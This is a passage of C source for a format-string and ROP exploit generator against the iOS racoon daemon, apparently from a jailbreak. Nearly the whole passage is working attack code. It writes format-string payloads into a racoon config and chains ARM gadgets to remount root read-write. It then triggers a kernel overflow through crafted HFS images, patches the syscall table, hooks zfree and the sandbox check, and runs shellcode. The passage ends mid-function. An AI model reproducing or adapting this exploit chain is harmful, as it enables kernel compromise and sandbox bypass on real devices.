#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define offsetof(type, member)  __builtin_offsetof (type, member)

#include "fsgen.h"
#include "fsgen-mac-defines.h"
#include "fsgen-global-constants.h"

#include "endianness.h"

typedef unsigned int Addr;

int STRLEN_PID;

struct constants* constants;
struct offsets* offsets;

// Do not initialize globals here! Initialize them in generate_rop.
unsigned int p2DataLo, p3Data;
int firstP2Write, firstP3Write;
int lines;

#define ROP_MODE_MEM 1
#define ROP_MODE_FILE 2
FILE* ropFile;
FILE* ropVarsFile;
unsigned int ropWriteMode;
unsigned int ropWriteVarsMode;
unsigned int ropWriteAddr;
unsigned int ropFileAddr;
unsigned char vars[VARS_MAX_SIZE];
Addr varsBaseAddr;
unsigned int varsWritten;

FILE* outFile;
char dataPath[1024];

short fsgetPadding(unsigned char data) {
	int i, v = 1;
	for (i = 0; i < 10; i++) {
		v = v * 10;
		if (lines < v) break;
	}
	short ret = data - LOG_SHIFT - i;
	if (ret < 10) ret += 256;
	return ret;
}

void fswriteByte(int param, unsigned char data) {
	lines++;
	fprintf(outFile, "\tmy_identifier user_fqdn \"%%%du%%%d$hhn\";\n", fsgetPadding(data), param);
}

void setP3Data(unsigned int data) {
	// The idea is to change p2Data lowest byte to p3AddrLo, p3AddrLo+1, p3AddrLo+2, p3AddrLo+3.
	// This way, 'data' is written to p3Data, byte per byte.
	unsigned int p3ByteAddr, i = 0;
	for (p3ByteAddr = P3_ADDR_LO; p3ByteAddr < (P3_ADDR_LO+4); p3ByteAddr++) {
		unsigned char p3DataByte = (data >> (i * 8)) & 0xff;
		unsigned int p3DataOr = p3DataByte << (i * 8);
		unsigned int p3DataMask = 0xff << (i * 8);

		if (firstP3Write || (p3Data & p3DataMask) != p3DataOr) {
			unsigned char newP2DataLo = p3ByteAddr & 0xff;
			if (firstP2Write || p2DataLo != newP2DataLo) {
				fswriteByte(constants->P1, newP2DataLo);
				p2DataLo = newP2DataLo; // this is the operation we're doing to p2Data
				firstP2Write = 0;
			}

			fswriteByte(constants->P2, p3DataByte);
			p3Data = p3Data & ~p3DataMask;
			p3Data = p3Data | p3DataOr; // this is the operation we're doing to p3Data
		}

		i++;
	}
	firstP3Write = 0;
}

void setP3DataEx(unsigned char p3AddrLo, unsigned int data) {
	// The idea is to change p2Data lowest byte to p3AddrLo, p3AddrLo+1, p3AddrLo+2, p3AddrLo+3.
	// This way, 'data' is written to p3Data, byte per byte.
	unsigned int p3ByteAddr, i = 0;
	for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo + 4; p3ByteAddr++) {
		unsigned char p3DataByte = (data >> (i * 8)) & 0xff;
		unsigned char newP2DataLo = p3ByteAddr & 0xff;
		fswriteByte(constants->P1, newP2DataLo);
		fswriteByte(constants->P2, p3DataByte);
		i++;
	}
}

void fsWrite(unsigned int addr, unsigned char data) {
	setP3Data(addr);
	// Then p3 will be used to write 'data' to 'addr'
	fswriteByte(constants->P3, data & 0xff);
}

void fsWriteAddrRel(unsigned char addrLo, unsigned int data) {
	setP3DataEx(addrLo, data);
}

void ropWrite(unsigned int value) {
	//fprintf(stderr, "0x%08x: 0x%08x\n", ropWriteAddr, value);
	if (ropWriteMode == ROP_MODE_MEM) {
		if (value == USELESS || value == PLACE_HOLDER) {
			ropWriteAddr += 4;
		} else {
			fsWrite(ropWriteAddr++, value & 0xff);
			fsWrite(ropWriteAddr++, (value>>8) & 0xff);
			fsWrite(ropWriteAddr++, (value>>16) & 0xff);
			fsWrite(ropWriteAddr++, (value>>24) & 0xff);
		}
	} else {
		if (ropFile == NULL) {
			ropFile = fopen(ROP_FILE_NAME, "wb");
			ropFileAddr = ropWriteAddr;
		}
		if (ropWriteAddr != ropFileAddr) fseek(ropFile, ropWriteAddr - ropFileAddr, SEEK_CUR);
		fwrite(&value, 1, 4, ropFile);
		ropWriteAddr += 4;
		ropFileAddr = ropWriteAddr;
	}
}

void ropWriteVars() {
	if (ropWriteVarsMode == ROP_MODE_MEM) {
		unsigned int i;
		Addr addr = varsBaseAddr;
		for (i = 0; i < varsWritten; i++) {
			fsWrite(addr, vars[i]);
			addr++;
		}
	} else {
		if (ropVarsFile == NULL) {
			ropVarsFile = fopen(VARS_FILE_NAME, "wb");
		}
		fwrite(vars, 1, varsWritten, ropVarsFile);
	}
	fprintf(stderr, "Vars end address: 0x%08x\n", varsBaseAddr + varsWritten);
	varsWritten = 0;
	memset(vars, 0, VARS_MAX_SIZE);
}

Addr newBinary(void* data, size_t size) {
        while (varsWritten%4!=0) varsWritten++;
	Addr ret = varsBaseAddr + varsWritten;
        memcpy(&vars[varsWritten], data, size);
        varsWritten += size;
	return ret;
}

Addr newString(char* s) {
        while (varsWritten%4!=0) varsWritten++;

	Addr ret = varsBaseAddr + varsWritten;
        strcpy(&vars[varsWritten], s);
        varsWritten += strlen(s) + 1;
        return ret;
}

Addr newInteger(unsigned int value) {
        while (varsWritten%4!=0) varsWritten++;

	Addr ret = varsBaseAddr + varsWritten;
	vars[varsWritten++] = value & 0xff;
	vars[varsWritten++] = (value>>8) & 0xff;
	vars[varsWritten++] = (value>>16) & 0xff;
	vars[varsWritten++] = (value>>24) & 0xff;
	return ret;
}

Addr newBuffer(unsigned int size) {
        while (varsWritten%4!=0) varsWritten++;

	Addr ret = varsBaseAddr + varsWritten;
	varsWritten += size;
	return ret;
}

Addr newArray(unsigned int values[], unsigned int count) {
        while (varsWritten%4!=0) varsWritten++;

        int i;
        Addr ret = 0;
        for (i = 0; i < count; i++) {
                Addr tmp = newInteger(values[i]);
                if (ret == 0) ret = tmp;
        }
        return ret;
}

void ropOpen() {
	p2DataLo = 0;
	p3Data = 0;
	firstP2Write = 1;
	firstP3Write = 1;
	lines = 0;
	ropFile = NULL;
	ropVarsFile = NULL;
	ropWriteMode = ROP_MODE_MEM;
	ropWriteVarsMode = ROP_MODE_MEM;
	ropWriteAddr = ROP2_ABS_ADDR;
	ropFileAddr = 0;
	varsBaseAddr = VARS_ABS_ADDR_1;
	varsWritten = 0;
	lines++;
	fprintf(outFile, "sainfo address ::1 icmp6 address ::1 icmp6 {\n");
	memset(vars, 0, VARS_MAX_SIZE);
}

void ropClose() {
	fprintf(stderr, "ROP end address: 0x%08x\n", ropWriteAddr);
	ropWriteVars();

	if (ropFile != NULL) fclose(ropFile);
	if (ropVarsFile != NULL) fclose(ropVarsFile);
	lines++;
	fprintf(outFile, "}\n");
}


unsigned int dscs;

void ropStackPivotLo(Addr toAddr) {
	fsWriteAddrRel(constants->LR_ADDR_LO,		dscs + offsets->LIBC_POP_R47);			// 0x00 pc
	fsWriteAddrRel(constants->LR_ADDR_LO + 0x4, 	toAddr);				// 0x04 r4
	fsWriteAddrRel(constants->LR_ADDR_LO + 0x8, 	USELESS);				// 0x08 r7
	fsWriteAddrRel(constants->LR_ADDR_LO + 0xc, 	dscs + offsets->LIBC_MOV_SP_R4__POP_R47);	// 0x0c pc
	ropWriteAddr = toAddr; // sp was changed
	ropWrite(USELESS);								// r4
	ropWrite(USELESS);								// r7
}

#define ROP_LOAD_REG4_CONST_LEN 0xc
void ropLoadReg4Const(unsigned int value) {
	ropWrite(dscs + offsets->LIBC_POP_R47);		// 0x00 pc
	ropWrite(value);			// 0x04 r4
	ropWrite(USELESS);			// 0x08 r7
}

#define ROP_LOAD_REG0_CONST_LEN 0x8
void ropLoadReg0Const(unsigned int value) {
	ropWrite(dscs + offsets->LIBC_POP_R0);		// 0x00 pc
	ropWrite(value);			// 0x04 r0
}

#define ROP_DEREF_REG0_LEN 0x8
void ropDerefReg0() {
	ropWrite(dscs + offsets->LIBC_LDR_R0_R0__POP_R7); // 0x00 pc
	ropWrite(USELESS);			// 0x04 r7
}

#define ROP_LOAD_REG0_LEN (ROP_LOAD_REG0_CONST_LEN + ROP_DEREF_REG0_LEN)
void ropLoadReg0(Addr ptrValue) {
	ropLoadReg0Const(ptrValue);
	ropDerefReg0();
}

#define ROP_SAVE_REG0_LEN (ROP_LOAD_REG4_CONST_LEN + 0xc)
void ropSaveReg0(Addr toAddr) {
	ropLoadReg4Const(toAddr);		// 0x00 pc
	ropWrite(dscs + offsets->LIBC_STR_R0_R4__POP_R47); // 0x0c pc
	ropWrite(USELESS);			// 0x10 r4
	ropWrite(USELESS);			// 0x14 r7
}

#define ROP_MOV_REG0_REG_1_LEN 0xc
void ropMovReg0Reg1() {
        ropWrite(dscs + offsets->GADGET_MOV_R0_R1__POP_R47);
        ropWrite(USELESS);
        ropWrite(USELESS);
}

#define ROP_MOV_REG1_REG_0_LEN 0xc
void ropMovReg1Reg0() {
        ropWrite(dscs + offsets->GADGET_MOV_R1_R0__POP_R47);
        ropWrite(USELESS);
        ropWrite(USELESS);
}

#define ROP_MOV_REG0_REG_4_LEN 0xc
void ropMovReg0Reg4() {
        ropWrite(dscs + offsets->GADGET_MOV_R0_R4__POP_R47);
        ropWrite(USELESS);
        ropWrite(USELESS);
}

#define ROP_MOV_REG0_REG_4_LEN 0xc
void ropMovReg1Reg4() {
        ropWrite(dscs + offsets->GADGET_MOV_R1_R4__POP_R47);
        ropWrite(USELESS);
        ropWrite(USELESS);
}

#define ROP_ADD_REG0_REG_1_LEN 0x10
void ropAddReg0Reg1() {
        ropWrite(dscs + offsets->GADGET_ADD_R0_R0_R1__POP457);
        ropWrite(USELESS);
        ropWrite(USELESS);
        ropWrite(USELESS);
}

#define ROP_SUB_REG0_REG_1_LEN 0x8
void ropSubReg0Reg1() {
        ropWrite(dscs + offsets->GADGET_SUBS_R0_R0_R1__POP7);
        ropWrite(USELESS);
}

#define ROP_SWAP_REG0_REG_1_LEN (ROP_SAVE_REG0_LEN + ROP_MOV_REG0_REG_1_LEN + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_MOV_REG1_REG_0_LEN + ROP_LOAD_REG0_LEN)
void ropSwapReg0Reg1() {
        static Addr swapTemp1 = 0;
        static Addr swapTemp2 = 0;

        if(swapTemp1 == 0)
            swapTemp1 = newInteger(0);

        if(swapTemp2 == 0)
            swapTemp2 = newInteger(0);

        ropSaveReg0(swapTemp1);
        ropMovReg0Reg1();
        ropSaveReg0(swapTemp2);
        ropLoadReg0(swapTemp1);
        ropMovReg1Reg0();
        ropLoadReg0(swapTemp2);
}

void ropAddReg0Const(unsigned int value) {
        ropMovReg1Reg0();
	ropLoadReg0Const(value);
        ropAddReg0Reg1();
}

void ropSubReg0Const(unsigned int value) {
	ropLoadReg4Const(value);
	ropWrite(dscs + offsets->LIBC_SUB_R0_R4__POP_R4567); // 0x0c pc
	ropWrite(USELESS);			// 0x10 r4
	ropWrite(USELESS);			// 0x14 r5
	ropWrite(USELESS);			// 0x18 r6
	ropWrite(USELESS);			// 0x1c r7
}

void ropStoreVariableValueAtOffsetFromVariableAddress(Addr address, unsigned int offset, Addr value)
{
        ropLoadReg0(address);
        ropAddReg0Const(offset);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + 0x4);
        ropLoadReg0(value);
        ropLoadReg4Const(PLACE_HOLDER);
	ropWrite(dscs + offsets->LIBC_STR_R0_R4__POP_R47); // 0x0c pc
	ropWrite(USELESS);			// 0x10 r4
	ropWrite(USELESS);			// 0x14 r7
}

void ropStoreValueAtOffsetFromVariableAddress(Addr address, unsigned int offset, unsigned int value)
{
    static Addr tempAddr = 0;
    if(tempAddr == 0)
        tempAddr = newInteger(0);

    ropLoadReg0Const(value);
    ropSaveReg0(tempAddr);
    ropStoreVariableValueAtOffsetFromVariableAddress(address, offset, tempAddr);
}

void ropStoreValue(Addr addr, unsigned int value) {
	ropLoadReg4Const(value);
        ropMovReg0Reg4();
        ropSaveReg0(addr);
}

void ropCall4Reg(Addr addr) {
	ropLoadReg4Const(addr);
	ropWrite(dscs + offsets->LIBC_BLX_R4_POP_R457);	// 0x0c pc
	ropWrite(USELESS);			// 0x10 r4
	ropWrite(USELESS);			// 0x14 r5
	ropWrite(USELESS);			// 0x18 r7
}

void ropCall7(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5, unsigned int p6, unsigned int p7) {
	ropWrite(dscs + offsets->LIBC_POP_R0123);	// 0x00 pc
	ropWrite(p1);				// 0x04 r0
	ropWrite(p2);				// 0x08 r1
	ropWrite(p3);				// 0x0c r2
	ropWrite(p4);				// 0x10 r3
	ropLoadReg4Const(addr);
	ropWrite(dscs + offsets->LIBC_BLX_R4_POP_R457);	// 0x20 pc		// pod2g: I guess this gadget has to be changed
	ropWrite(p5);				// 0x24 r4 (and p5)
	ropWrite(p6);				// 0x28 r5 (and p6)
	ropWrite(p7);				// 0x2c r7 (and p7)
}

void ropCall6(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5, unsigned int p6) {
	ropCall7(addr, p1, p2, p3, p4, p5, p6, USELESS);
}

void ropCall5(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5) {
	ropCall6(addr, p1, p2, p3, p4, p5, USELESS);
}
void ropCall4(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4) {
	ropCall6(addr, p1, p2, p3, p4, USELESS, USELESS);
}
void ropCall3(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3) {
	ropCall6(addr, p1, p2, p3, USELESS, USELESS, USELESS);
}
void ropCall2(Addr addr, unsigned int p1, unsigned int p2) {
	ropCall6(addr, p1, p2, USELESS, USELESS, USELESS, USELESS);
}
void ropCall1(Addr addr, unsigned int p1) {
	ropCall6(addr, p1, USELESS, USELESS, USELESS, USELESS, USELESS);
}
void ropCall0(Addr addr) {
	ropCall6(addr, USELESS, USELESS, USELESS, USELESS, USELESS, USELESS);
}

void ropLog(char* msg) {
	ropCall2(dscs + offsets->_dsc_syslog, LOG_WARNING, newString(msg));
}

struct trojan_msg {
    mach_msg_header_t          header;
    uint32_t                   r8;
    uint32_t                   r10;
    uint32_t                   r4;
    uint32_t                   r5;
    uint32_t                   r6;
    uint32_t                   r7;
    uint32_t                   pc;
    uint32_t                   crap[7];
};

Addr ptrFd;
Addr vn;
Addr mountArgs;

void _unmount(Addr vndevice, Addr mntPoint) {
	//ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Unmounting: %s\n"), mntPoint);

        ropCall2(dscs + offsets->_dsc_unmount, mntPoint, 0);

        ropCall2(dscs + offsets->_dsc_open, vndevice, O_RDONLY);
	ropSaveReg0(ptrFd);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x4);
	ropCall3(dscs + offsets->_dsc_ioctl, PLACE_HOLDER, VNIOCDETACH, vn);
	ropLoadReg0(ptrFd);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x4);
	ropCall1(dscs + offsets->_dsc_close, PLACE_HOLDER);
}

void prepareMount(Addr vndevice, Addr mntPoint, char* vnimage) {
	//ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Creating directory: %s\n"), mntPoint);

        ropCall2(dscs + offsets->_dsc_mkdir, mntPoint, 0777);

        //ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Attaching vndevice: %s\n"), vndevice);

        ropCall2(dscs + offsets->_dsc_open, vndevice, O_RDONLY);
	ropSaveReg0(ptrFd);

        ropLoadReg0Const(newString(vnimage));
	ropSaveReg0(vn + 0x00); // vn.vn_file
	ropLoadReg0Const((int)vncontrol_readwrite_io_e);
	ropSaveReg0(vn + 0x08); // vn.vn_control

	ropLoadReg0(ptrFd);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // writes the 1st parameter of ioctl
	ropCall3(dscs + offsets->_dsc_ioctl, PLACE_HOLDER, VNIOCATTACH, vn);

	ropLoadReg0(ptrFd);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // writes the 1st parameter of close
	ropCall1(dscs + offsets->_dsc_close, PLACE_HOLDER);
}

void _mount(Addr vndevice, Addr mntPoint) {
        //ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Mounting vndevice to: %s\n"), mntPoint);

        ropLoadReg0Const(vndevice);
	ropSaveReg0(mountArgs + 0x00); // mount_args.fspec
	ropLoadReg0Const(99);
	ropSaveReg0(mountArgs + 0x04); // mount_args.hfs_uid
	ropLoadReg0Const(99);
	ropSaveReg0(mountArgs + 0x08); // mount_args.hfs_gid
	ropLoadReg0Const(S_IRWXU | S_IROTH | S_IXOTH);
	ropSaveReg0(mountArgs + 0x0c); // mount_args.hfs_mask

        ropCall4(dscs + offsets->_dsc_mount, newString("hfs"), mntPoint, MNT_RDONLY, mountArgs);
}

void _remountroot() {
	ropLog("* Remounting root read-write...\n");
        Addr remountArgs = newBuffer(sizeof(struct hfs_mount_args));

	ropLoadReg0Const(0);
        int i;
        for(i = 0; i < (sizeof(struct hfs_mount_args) / 4); ++i)
        {
            ropSaveReg0(remountArgs + (0x4 * i));
        }

        ropLoadReg0Const(newString("/dev/disk0s1s1"));
	ropSaveReg0(remountArgs + 0x00); // mount_args.fspec

	unsigned int p2 = newString("/");
	unsigned int p1 = newString("hfs");
        ropCall4(dscs + offsets->_dsc_mount, p1, p2, MNT_UPDATE, remountArgs);

	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c);
        ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("* mount returned: %d\n"), PLACE_HOLDER);
}

void bootstrap()
{
        _remountroot();

	ropLog("* Starting kernel exploit...\n");

	ptrFd = newInteger(0);
	vn = newBuffer(sizeof(struct vn_ioctl));
	mountArgs = newBuffer(sizeof(struct hfs_mount_args));

        ropCall2(dscs + offsets->_dsc_mkdir, newString("/Volumes"), 0777);

	Addr vndevice0 = newString("/dev/vn0");
	Addr vndevice1 = newString("/dev/vn1");
	Addr mntPoint0 = newString("/Volumes/0");
	Addr mntPoint1 = newString("/Volumes/1");

	_unmount(vndevice0, mntPoint0);
	_unmount(vndevice1, mntPoint1);
	prepareMount(vndevice0, mntPoint0, "vnimage.clean");
	_mount(vndevice0, mntPoint0);
	prepareMount(vndevice1, mntPoint1, "vnimage.clean");
	_mount(vndevice1, mntPoint1);
	_unmount(vndevice0, mntPoint0);
	_unmount(vndevice1, mntPoint1);
	prepareMount(vndevice0, mntPoint0, "vnimage.overflow");
	_mount(vndevice0, mntPoint0);
	_unmount(vndevice0, mntPoint0);
	prepareMount(vndevice0, mntPoint0, "vnimage.clean");
	_mount(vndevice0, mntPoint0);
	prepareMount(vndevice1, mntPoint1, "vnimage.payload");
	_mount(vndevice1, mntPoint1);

	// - syscalls table restore (generated at ROP compile time)
	FILE* f;
	char fileName[1024];
	int len = 0;
	unsigned int j;
	unsigned int sysentRestore[0x80];
	snprintf(fileName, sizeof(fileName), "%s/sysent_1c50", dataPath);
	f = fopen(fileName, "rb");
	if (f) {
		fread(&sysentRestore[0], 4, 0x80, f);
		fclose(f);
	} else {
		fprintf(stderr, "Error opening '%s'\n", fileName);
	}
	for (j = 0; j < 0x80; j++) {
		sysentRestore[j] = le32toh(sysentRestore[j]);
	}
	// quick syscall restore
        for (j = 0; j < 0x2b; j++) {
		ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4, sysentRestore[j]); // -4 because of the gadget doing a str [rx, #4]
        }
	for (j = 0x31; j < 0x80; j+=6) {
		ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4, sysentRestore[j]);
        }
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x1f8 - 4, sysentRestore[0x1f8 >> 2]);

	// zfree hooker
	snprintf(fileName, sizeof(fileName), "%s/zfreehooker.bin", dataPath);
	f = fopen(fileName, "rb");
	if (f) {
		fseek(f, 0, SEEK_END);
		len = ftell(f);
		fseek(f, 0, SEEK_SET);
		unsigned int zfreehooker[len >> 2];
		fread(&zfreehooker[0], 4, len >> 2, f);
		fclose(f);
		for (j = 0; j < (len >> 2); j++) {
			zfreehooker[j] = le32toh(zfreehooker[j]);
			ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOKER_ADDR + (j << 2) - 4, zfreehooker[j]);
		}
	} else {
		fprintf(stderr, "Error opening '%s'\n", fileName);
	}

	// zfree hook
	snprintf(fileName, sizeof(fileName), "%s/zfreehook.bin", dataPath);
	f = fopen(fileName, "rb");
	if (f) {
		fseek(f, 0, SEEK_END);
		len = ftell(f);
		fseek(f, 0, SEEK_SET);
		unsigned int zfreehook[len >> 2];
		fread(&zfreehook[0], 4, len >> 2, f);
		fclose(f);
		for (j = 0; j < (len >> 2); j++) {
			zfreehook[j] = le32toh(zfreehook[j]);
			ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOK_ADDR + (j << 2) - 4, zfreehook[j]);
		}
	} else {
		fprintf(stderr, "Error opening '%s'\n", fileName);
	}

	// invalidate all dcache
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4, offsets->FLUSH_DCACHE_ALL);
	ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
	// invalidate all icache
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4, offsets->INVALIDATE_ICACHE_ALL);
	ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);

	// shellcode copy
	snprintf(fileName, sizeof(fileName), "%s/shellcode.bin", dataPath);
	f = fopen(fileName, "rb");
	if (f) {
		fseek(f, 0, SEEK_END);
		len = ftell(f);
		fseek(f, 0, SEEK_SET);
		unsigned int shellcode[len >> 2];
		fread(&shellcode[0], 4, len >> 2, f);
		fclose(f);
		for (j = 0; j < (len >> 2); j++) {
			shellcode[j] = le32toh(shellcode[j]);
			ropCall3(dscs + offsets->_dsc_syscall, 309, SHELLCODE_ADDR + (j << 2) - 4, shellcode[j]);
		}
	} else {
		fprintf(stderr, "Error opening '%s'\n", fileName);
	}

	// sb_evaluate hooker
	snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehooker.bin", dataPath);
	f = fopen(fileName, "rb");
	if (f) {
		fseek(f, 0, SEEK_END);
		len = ftell(f);
		fseek(f, 0, SEEK_SET);
		unsigned int sb_evaluatehooker[len >> 2];
		fread(&sb_evaluatehooker[0], 4, len >> 2, f);
		fclose(f);
		for (j = 0; j < (len >> 2); j++) {
			sb_evaluatehooker[j] = le32toh(sb_evaluatehooker[j]);
			ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOKER_ADDR + (j << 2) - 4, sb_evaluatehooker[j]);
		}
	} else {
		fprintf(stderr, "Error opening '%s'\n", fileName);
	}

	// sb_evaluate hook
	snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehook.bin", dataPath);
	f = fopen(fileName, "rb");
	if (f) {
		fseek(f, 0, SEEK_END);
		len = ftell(f);
		fseek(f, 0, SEEK_SET);
		unsigned int sb_evaluatehook[len >> 2];
		fread(&sb_evaluatehook[0], 4, len >> 2, f);
		fclose(f);
		for (j = 0; j < (len >> 2); j++) {
			sb_evaluatehook[j] = le32toh(sb_evaluatehook[j]);
			ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOK_ADDR + (j << 2) - 4, sb_evaluatehook[j]);
		}
	} else {
		fprintf(stderr, "Error opening '%s'\n", fileName);
	}

	// invalidate all dcache
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4, offsets->FLUSH_DCACHE_ALL);
	ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
	// invalidate all icache
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4, offsets->INVALIDATE_ICACHE_ALL);
	ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);

	// shellcode execute
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4, SHELLCODE_ADDR + 1); // changes syscall 308 to the shellcode
	ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS); // executes it

	// syscall restore
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4, sysentRestore[0x94 >> 2]);
	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0xac - 4, sysentRestore[0xac >> 2]);

	// - unmount everything
	_unmount(vndevice0, mntPoint0);
	_unmount(vndevice1, mntPoint1);

	// -------------------------------------------------------------

	ropLog("* Finished. Executing hello.\n");

        ropCall2(dscs + offsets->_dsc_chmod, newString("/var/mobile/Media/corona/jailbreak"), 0755);
	unsigned int p2 = newString("/var/mobile/Media/corona/jailbreak");
	unsigned int p1 = newString("/var/mobile/Media/corona/jailbreak");
        ropCall3(dscs + offsets->_dsc_execl, p1, p2, 0);
	ropCall1(dscs + offsets->_dsc_exit, 0);
}

void exploit()
{
	ropLog("Entering racoon ROP.\n");

        Addr aShmBaseAddress = newInteger(0);
        ropCall3(dscs + offsets->_dsc_shm_open, newString("apple.shm.notification_center"), O_RDWR | O_CREAT, 0644);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // shm fd to PLACE_HOLDER
        ropCall7(dscs + offsets->_dsc_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, PLACE_HOLDER, 0, 0);
        ropAddReg0Const(0xF00);
        ropSaveReg0(aShmBaseAddress);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
	ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("shmBaseAddress: %x\n"), PLACE_HOLDER);

        Addr aStat = newInteger(0);
        Addr aSize = newInteger(0);
        Addr aRacoonSrcFd = newInteger(0);
        Addr aRacoonDstFd = newInteger(0);
        Addr aRacoonSrc = newInteger(0);
        Addr aRacoonDst = newInteger(0);

	ropCall1(dscs + offsets->_dsc_malloc, sizeof(struct stat));
        ropSaveReg0(aStat);

        ropCall2(dscs + offsets->_dsc_open, newString("/usr/sbin/racoon"), O_RDONLY);
        ropSaveReg0(aRacoonSrcFd);

        ropLoadReg0(aStat);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // stat to second PLACE_HOLDER
        ropLoadReg0(aRacoonSrcFd);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrcFd to PLACE_HOLDER
        ropCall2(dscs + offsets->_dsc_fstat, PLACE_HOLDER, PLACE_HOLDER);

        ropLoadReg0(aStat);
        ropAddReg0Const(offsetof(struct stat, st_size));
        ropDerefReg0();
        ropSaveReg0(aSize);

        ropLoadReg0(aSize);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to first PLACE_HOLDER
        ropLoadReg0(aRacoonSrcFd);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // racoonSrcFd to second PLACE_HOLDER
        ropCall7(dscs + offsets->_dsc_mmap, 0, PLACE_HOLDER, PROT_READ, MAP_SHARED, PLACE_HOLDER, 0, 0);
        ropSaveReg0(aRacoonSrc);

        Addr aRacoonDstFileName = newString("/private/var/log/racoon.log");

        ropCall1(dscs + offsets->_dsc_unlink, aRacoonDstFileName);

        ropCall3(dscs + offsets->_dsc_open, aRacoonDstFileName, O_CREAT | O_RDWR, 0777);
        ropSaveReg0(aRacoonDstFd);

        ropLoadReg0(aSize);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
        ropLoadReg0(aRacoonDstFd);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDstFd to first PLACE_HOLDER
        ropCall3(dscs + offsets->_dsc_ftruncate, PLACE_HOLDER, PLACE_HOLDER, 0);

        ropLoadReg0(aSize);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to first PLACE_HOLDER
        ropLoadReg0(aRacoonDstFd);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // racoonDstFd to second PLACE_HOLDER
        ropCall7(dscs + offsets->_dsc_mmap, 0, PLACE_HOLDER, PROT_READ | PROT_WRITE, MAP_SHARED, PLACE_HOLDER, 0, 0);
        ropSaveReg0(aRacoonDst);

        ropLoadReg0(aSize);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x0c); // st.st_size to third PLACE_HOLDER
        ropLoadReg0(aRacoonSrc);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // racoonSrc to second PLACE_HOLDER
        ropLoadReg0(aRacoonDst);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
        ropCall3(dscs + offsets->_dsc_memcpy, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER);

        ropLoadReg0(aSize);
